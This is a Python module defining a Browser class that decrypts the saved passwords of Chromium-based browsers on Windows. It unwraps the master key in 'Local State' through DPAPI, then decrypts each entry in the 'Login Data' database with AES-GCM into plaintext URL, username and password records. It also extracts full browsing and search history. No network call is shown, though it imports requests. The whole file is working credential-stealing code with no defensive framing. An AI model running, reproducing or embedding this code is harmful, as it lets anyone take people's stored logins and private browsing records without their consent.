import sqlite3
import win32crypt
import base64
import json
import requests
from Crypto.Cipher import AES
class InvalidVersionError(Exception):
    pass
class BrowserOpenError(Exception):
    pass
class Error(Exception):
    pass
class Browser:
    def __init__(self,Name,Version,Path):
        self.Name = Name
        self.Version = Version
        self.BrowserPath:str = Path
        self.MasterKey = self.get_master_key()
    @property
    def BrowserVersion(self):
        return self.Version
    def Get_Passwords(self):
        result = {}
        try:
            conn = sqlite3.connect("{}\\User Data\\Default\\Login Data".format(self.BrowserPath))
            if conn:
                curs = conn.cursor()
                curs.execute("SELECT action_url, username_value, password_value FROM logins")
                for row in curs.fetchall():
                    url, Username, password = row
                    if Username == '': Username = None
                    result[url] = {"Username":Username,"Password":self.decrypt_password(password)}
            return result
        except sqlite3.OperationalError as e:
            raise BrowserOpenError("{} is open, please close it and try again.".format(self.Name))
        except:
            pass
    def Get_Search_History(self):
        result = {}
        try:

            conn = sqlite3.connect("{}\\User Data\\Default\\History".format(self.BrowserPath))
            if conn:
                curs = conn.cursor()
                curs.execute("SELECT datetime(last_visit_time/1000000 - 11644473600, 'unixepoch'), url, title FROM urls WHERE url LIKE '%search?q=%' ORDER BY last_visit_time DESC")

                for i,row in enumerate(curs.fetchall()):
                    Date, url, Search = row
                    result[i] = {"Search":Search,"Date":Date,"Url":url}
            return result
        except sqlite3.OperationalError as e:
            raise BrowserOpenError("{} is open, please close it and try again.".format(self.Name))
        except:
            pass
    def Get_History(self):
        result = {}
        try:
            conn = sqlite3.connect("{}\\User Data\\Default\\History".format(self.BrowserPath))
            if conn:
                curs = conn.cursor()
                curs.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
                for row in curs.fetchall():
                    title, last_visited, url = row
                    result[url] = {"title":title,"last_visited":last_visited}
            return result
        except sqlite3.OperationalError as e:
            raise BrowserOpenError("{} is open, please close it and try again.".format(self.Name))
        except:
            pass
    def get_master_key(self):
        try:
            with open('{}\\User Data\\Local State'.format(self.BrowserPath), "r",
                      encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return
    def decrypt_payload(self,cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self,aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self,buff):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(self.MasterKey, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as e:
            # print("Probably saved password from Edge version older than v80\n")
            # print(str(e))
            raise InvalidVersionError("invalid {} version, error - {}".format(self.Name,e))